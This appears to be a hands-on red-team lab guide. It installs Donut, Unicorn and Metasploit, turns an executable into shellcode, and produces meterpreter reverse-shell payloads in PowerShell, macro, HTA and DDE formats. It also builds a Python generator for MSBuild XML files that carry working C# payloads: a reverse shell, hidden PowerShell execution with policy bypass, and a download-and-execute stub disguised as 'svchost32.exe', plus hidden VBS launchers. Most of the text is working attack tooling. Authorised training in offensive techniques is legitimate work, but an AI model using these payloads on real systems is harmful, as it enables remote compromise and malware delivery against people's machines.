@@ -1,0 +1,362 @@
+Generate Custom Payloads with Donut, Unicorn, and MSBuild
+Objectives
+Install and use the Donut framework to convert a Windows executable into position-independent shellcode
+Generate PowerShell and macro-based reverse shell payloads using the Unicorn toolkit
+Build a Python automation script that produces MSBuild XML payloads with configurable payload types
+Prerequisites
+Comfort with the Ubuntu command line: navigating directories, running scripts, reading command output
+Basic Python 3 knowledge: classes, methods, file I/O, and subprocess calls
+Familiarity with networking concepts: what a reverse shell is, what LHOST and LPORT mean
+Lab Environment
+You will work on a dedicated AWS EC2 Ubuntu instance provided by Al Nafi. The instance has a base Ubuntu installation; you will install all required tools in Task 1.
+
+Task 1: Install and Verify All Required Tools
+This task installs every tool the lab depends on. Complete all steps before moving to Task 2.
+
+Step 1: Update the system and install build dependencies
+sudo apt-get update -y && sudo apt-get upgrade -y
+sudo apt-get install -y git build-essential python3 python3-pip wget unzip mingw-w64
+Confirm success: python3 --version prints a 3.x version and x86_64-w64-mingw32-gcc --version prints a compiler version.
+
+Step 2: Install the Donut framework
+Donut is a tool that converts Windows executables (.exe, .dll) into position-independent shellcode that can run from memory.
+
+cd /opt
+sudo git clone https://github.com/TheWover/donut.git
+cd donut
+sudo make
+Official installation reference if the repository URL changes: https://github.com/TheWover/donut
+
+Confirm success: running ./donut with no arguments prints a usage banner that lists -f, -a, and -o flags.
+
+Troubleshoot this step:
+
+Error seen: make: *** [Makefile:XX: donut] Error 1 with a message about a missing header such as windows.h.
+Recovery: run sudo apt-get install -y gcc-multilib then repeat sudo make from /opt/donut.
+Official docs: https://github.com/TheWover/donut#building
+Step 3: Install the Unicorn toolkit
+Unicorn (by TrustedSec) is a Python-based tool that wraps msfvenom to produce shellcode and wraps it in delivery formats such as PowerShell scripts and Office macros.
+
+cd /opt
+sudo git clone https://github.com/trustedsec/unicorn.git
+sudo chmod +x /opt/unicorn/unicorn.py
+sudo ln -sf /opt/unicorn/unicorn.py /usr/local/bin/unicorn
+Official reference if the repository URL changes: https://github.com/trustedsec/unicorn
+
+Confirm success: unicorn --help (or python3 /opt/unicorn/unicorn.py --help) prints a usage banner listing payload format options.
+
+Troubleshoot this step:
+
+Error seen: bash: unicorn: command not found after creating the symlink.
+Recovery: verify the symlink with ls -la /usr/local/bin/unicorn; if it points to a non-existent path, recreate it with the full absolute path: sudo ln -sf /opt/unicorn/unicorn.py /usr/local/bin/unicorn.
+Official docs: https://github.com/trustedsec/unicorn#installation
+Step 4: Install Metasploit Framework (required by Unicorn)
+Unicorn calls msfvenom internally to generate shellcode, so Metasploit must be present.
+
+cd /tmp
+wget -fsSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -O msfinstall
+chmod +x msfinstall
+sudo ./msfinstall
+Official reference if the installer URL changes: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
+
+Confirm success: msfvenom --version prints a version string such as Framework Version: 6.x.x.
+
+Troubleshoot this step:
+
+Error seen: wget: unable to resolve host 'raw.githubusercontent.com' or HTTP 404 written to msfinstall.
+Recovery: check network connectivity with curl -I https://raw.githubusercontent.com and consult the official nightly installer page for an updated URL.
+Official docs: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
+Task 2: Generate Shellcode with Donut and Payloads with Unicorn
+Step 1: Create a test Windows executable with MinGW
+MinGW (Minimalist GNU for Windows) lets you cross-compile Windows binaries on Linux. You will compile a minimal C program that launches calc.exe, then feed it to Donut.
+
+mkdir -p ~/lab11/payloads
+cd ~/lab11/payloads
+
+cat > hello_calc.c << 'EOF'
+#include <windows.h>
+int main(void) {
+    WinExec("calc.exe", SW_SHOW);
+    return 0;
+}
+EOF
+
+x86_64-w64-mingw32-gcc hello_calc.c -o hello_calc.exe -lkernel32
+Confirm success: ls -lh hello_calc.exe shows a file larger than 0 bytes with a .exe extension.
+
+Step 2: Convert the executable to shellcode with Donut
+Run Donut three times to produce the same shellcode in three output formats. The -f flag controls format (1 = raw binary, 2 = C array, 3 = Python bytes literal) and -a 2 targets x64.
+
+cd ~/lab11/payloads
+
+/opt/donut/donut -f 1 -a 2 -o shellcode.bin hello_calc.exe
+/opt/donut/donut -f 2 -a 2 -o shellcode.c   hello_calc.exe
+/opt/donut/donut -f 3 -a 2 -o shellcode.py  hello_calc.exe
+Confirm success: ls -lh shellcode.* shows three files; shellcode.bin is typically 5-50 KB depending on the input executable size.
+
+Step 3: Generate a PowerShell reverse-shell payload with Unicorn
+Replace YOUR_IP below with the IP address shown by ip addr show on your instance (the eth0 inet address). Port 4444 is used as the listener port throughout this lab.
+
+mkdir -p ~/lab11/unicorn_payloads
+cd ~/lab11/unicorn_payloads
+
+python3 /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp YOUR_IP 4444 powershell
+Confirm success: Unicorn creates two files in the current directory: powershell_attack.txt (the delivery one-liner) and unicorn.rc (a ready-made Metasploit listener resource script).
+
+Step 4: Write a Python wrapper that automates Unicorn for multiple formats
+Complete the skeleton below. Save it as ~/lab11/unicorn_payloads/unicorn_wrapper.py.
+
+class UnicornWrapper:
+    """Automate Unicorn payload generation for multiple delivery formats."""
+
+    UNICORN_PATH = "/opt/unicorn/unicorn.py"
+    SUPPORTED_FORMATS = ["powershell", "macro", "hta", "dde"]
+
+    def __init__(self, lhost: str, lport: int, payload: str = "windows/meterpreter/reverse_tcp"):
+        """Store connection parameters and payload string."""
+        # TODO: Assign lhost, lport, and payload to instance attributes
+        pass
+
+    def generate(self, fmt: str, output_dir: str) -> bool:
+        """
+        Run Unicorn for a single delivery format and move output files
+        into output_dir so each format has its own subdirectory.
+
+        Returns True on success, False on non-zero exit code.
+        """
+        # TODO: Build the subprocess command list:
+        #       ["python3", self.UNICORN_PATH, self.payload, self.lhost, str(self.lport), fmt]
+        # TODO: Create output_dir if it does not exist
+        # TODO: Run the command with subprocess.run, capturing stdout and stderr,
+        #       using output_dir as the working directory (cwd=)
+        # TODO: Return True if returncode == 0, otherwise print stderr and return False
+        pass
+
+    def generate_all(self, base_dir: str) -> dict:
+        """
+        Call generate() for every format in SUPPORTED_FORMATS.
+        Returns a dict mapping format name -> True/False result.
+        """
+        # TODO: Iterate over SUPPORTED_FORMATS
+        # TODO: For each format, call self.generate(fmt, os.path.join(base_dir, fmt))
+        # TODO: Collect results in a dict and return it
+        pass
+
+    def write_listener_rc(self, path: str) -> None:
+        """
+        Write a Metasploit resource script to path that starts a
+        multi/handler for the configured payload, LHOST, and LPORT.
+        """
+        # TODO: Build the rc file content as a multi-line string with:
+        #       use exploit/multi/handler
+        #       set payload <self.payload>
+        #       set LHOST <self.lhost>
+        #       set LPORT <self.lport>
+        #       set ExitOnSession false
+        #       exploit -j -z
+        # TODO: Write the string to path
+        pass
+
+
+def main():
+    """Parse --lhost, --lport, --format (optional), --all flags with argparse."""
+    # TODO: Set up ArgumentParser with the flags listed in the docstring
+    # TODO: Instantiate UnicornWrapper with parsed arguments
+    # TODO: If --all is set, call generate_all(); otherwise call generate() for --format
+    # TODO: Always call write_listener_rc() to produce listener.rc in the output directory
+    pass
+
+
+if __name__ == "__main__":
+    main()
+Run your completed script:
+
+python3 ~/lab11/unicorn_payloads/unicorn_wrapper.py --lhost YOUR_IP --lport 4444 --all
+Confirm success: subdirectories named powershell, macro, hta, and dde appear under ~/lab11/unicorn_payloads/, each containing Unicorn output files, and listener.rc is written to the base directory.
+
+Task 3: Build an MSBuild XML Payload Generator
+MSBuild is Microsoft's build engine. Its CodeTaskFactory feature compiles and runs inline C# at build time, which red teams use to execute code through a signed Microsoft binary (MSBuild.exe). In this task you write a Python generator that produces valid MSBuild XML files.
+
+Step 1: Create the MSBuild XML template
+mkdir -p ~/lab11/msbuild_payloads
+cd ~/lab11/msbuild_payloads
+
+cat > msbuild_template.xml << 'EOF'
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Run">
+    <InlineTask />
+  </Target>
+  <UsingTask
+    TaskName="InlineTask"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+        using System;
+        using System.Diagnostics;
+        using System.Net.Sockets;
+        using System.IO;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+
+        public class InlineTask : Task, ITask
+        {
+          public override bool Execute()
+          {
+            /* PAYLOAD_PLACEHOLDER */
+            return true;
+          }
+        }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+EOF
+Confirm success: cat msbuild_template.xml shows the full XML with the PAYLOAD_PLACEHOLDER comment inside the Execute method.
+
+Step 2: Write the MSBuild payload generator class
+Save the file as ~/lab11/msbuild_payloads/msbuild_generator.py.
+
+class MSBuildGenerator:
+    """
+    Reads msbuild_template.xml and produces ready-to-use MSBuild XML
+    files by injecting C# payload snippets.
+    """
+
+    TEMPLATE_PATH = "msbuild_template.xml"
+    PLACEHOLDER   = "/* PAYLOAD_PLACEHOLDER */"
+
+    # C# snippet templates â use {LHOST}, {LPORT}, {COMMAND}, {URL} as placeholders
+    SNIPPETS = {
+        "reverse_shell": """
+            try {
+                TcpClient c = new TcpClient("{LHOST}", {LPORT});
+                Stream s = c.GetStream();
+                byte[] buf = new byte[4096];
+                int n;
+                while ((n = s.Read(buf, 0, buf.Length)) != 0) {
+                    string cmd = System.Text.Encoding.ASCII.GetString(buf, 0, n).Trim();
+                    ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd) {
+                        RedirectStandardOutput = true,
+                        RedirectStandardError  = true,
+                        UseShellExecute        = false
+                    };
+                    Process p = Process.Start(psi);
+                    string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+                    p.WaitForExit();
+                    byte[] resp = System.Text.Encoding.ASCII.GetBytes(output);
+                    s.Write(resp, 0, resp.Length);
+                }
+                c.Close();
+            } catch {}
+        """,
+        "powershell_exec": """
+            try {
+                ProcessStartInfo psi = new ProcessStartInfo("powershell.exe") {
+                    Arguments      = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command {COMMAND}",
+                    UseShellExecute = false,
+                    CreateNoWindow  = true
+                };
+                Process.Start(psi);
+            } catch {}
+        """,
+        "download_exec": """
+            try {
+                string tmp = Path.Combine(Path.GetTempPath(), "svchost32.exe");
+                new System.Net.WebClient().DownloadFile("{URL}", tmp);
+                Process.Start(tmp);
+            } catch {}
+        """
+    }
+
+    def __init__(self, template_path: str = None):
+        """Load the XML template from disk."""
+        # TODO: Use self.TEMPLATE_PATH if template_path is None
+        # TODO: Open the file and store its contents in self.template
+        # TODO: Raise FileNotFoundError with a clear message if the file is missing
+        pass
+
+    def _inject(self, snippet: str, **kwargs) -> str:
+        """
+        Replace {KEY} placeholders in snippet with values from kwargs,
+        then substitute PLACEHOLDER in self.template with the result.
+        Returns the complete XML string.
+        """
+        # TODO: Iterate over kwargs; for each key replace "{KEY}" in snippet with str(value)
+        # TODO: Replace self.PLACEHOLDER in self.template with the filled snippet
+        # TODO: Return the resulting XML string
+        pass
+
+    def build(self, payload_type: str, output_path: str, **kwargs) -> bool:
+        """
+        Generate an MSBuild XML file for payload_type and write it to output_path.
+        kwargs must supply the values required by the chosen snippet
+        (lhost+lport for reverse_shell, command for powershell_exec, url for download_exec).
+        Returns True on success.
+        """
+        # TODO: Look up payload_type in self.SNIPPETS; print an error and return False if missing
+        # TODO: Call self._inject() with the snippet and kwargs
+        # TODO: Write the XML string to output_path
+        # TODO: Print a confirmation line and return True
+        pass
+
+    def build_launcher(self, xml_path: str, launcher_type: str = "bat") -> str:
+        """
+        Write a launcher file (bat or vbs) next to xml_path that invokes
+        MSBuild.exe on the XML file.
+        Returns the path of the created launcher file.
+        """
+        # TODO: Derive the launcher path by replacing the .xml extension with .bat or .vbs
+        # TODO: For "bat": write a two-line batch file that calls
+        #       C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe "<xml_path>"
+        # TODO: For "vbs": write a WScript.Shell .Run call with window style 0 (hidden)
+        # TODO: Return the launcher path
+        pass
+
+
+def main():
+    """
+    CLI entry point.
+    Flags: -t/--type, -o/--output, -l/--lhost, -p/--lport,
+           -c/--command, -u/--url, --launcher [bat|vbs]
+    """
+    # TODO: Build ArgumentParser with the flags listed above
+    # TODO: Instantiate MSBuildGenerator
+    # TODO: Call generator.build() with the appropriate kwargs for the chosen type
+    # TODO: If --launcher is provided, call generator.build_launcher()
+    pass
+
+
+if __name__ == "__main__":
+    main()
+Step 3: Test the generator for all three payload types
+cd ~/lab11/msbuild_payloads
+
+python3 msbuild_generator.py -t reverse_shell  -o rs.xml  -l YOUR_IP -p 4444 --launcher bat
+python3 msbuild_generator.py -t powershell_exec -o ps.xml  -c "whoami > C:\\temp\\out.txt" --launcher vbs
+python3 msbuild_generator.py -t download_exec   -o dl.xml  -u "http://YOUR_IP/payload.exe"
+Confirm success: ls -lh *.xml *.bat *.vbs shows rs.xml, rs.bat, ps.xml, ps.vbs, and dl.xml all with non-zero sizes.
+
+Step 4: Verify the XML is well-formed
+Python's built-in xml.etree.ElementTree can parse the file without executing it, confirming the XML structure is valid before you transfer it to a Windows target.
+
+python3 -c "
+import xml.etree.ElementTree as ET
+for f in ['rs.xml', 'ps.xml', 'dl.xml']:
+    try:
+        ET.parse(f)
+        print(f'[OK] {f} is well-formed XML')
+    except ET.ParseError as e:
+        print(f'[FAIL] {f}: {e}')
+"
+Confirm success: all three files print [OK]. A [FAIL] line means the _inject method introduced a syntax error in the XML; re-examine how the C# snippet is inserted and ensure <, >, and & characters inside the CDATA block are not double-escaped.
+
+Expected Outcomes
+Three shellcode files (shellcode.bin, shellcode.c, shellcode.py) produced by Donut from a cross-compiled Windows executable, and at least one Unicorn delivery-format directory containing a PowerShell attack file and a Metasploit resource script.
+Three well-formed MSBuild XML files covering reverse shell, PowerShell execution, and download-and-execute payload types, each generated by the Python class you wrote.
+Troubleshooting
+Symptom: donut exits with Error: could not open file when pointing at hello_calc.exe. Diagnostic hint: Confirm the file exists and is a valid PE binary with file hello_calc.exe; it must report PE32+ executable (console) x86-64 â if it says ASCII text the MinGW compilation failed silently and you should rerun the x86_64-w64-mingw32-gcc command and check its exit code with echo $?.
+
+Symptom: unicorn_wrapper.py completes with exit code 0 but the output subdirectory is empty. Diagnostic hint: Unicorn writes its output files to the current working directory at the time it runs; check that your subprocess.run call passes cwd=output_dir and that output_dir is an absolute path â print the resolved path inside generate() before the subprocess call to confirm it matches what you expect.
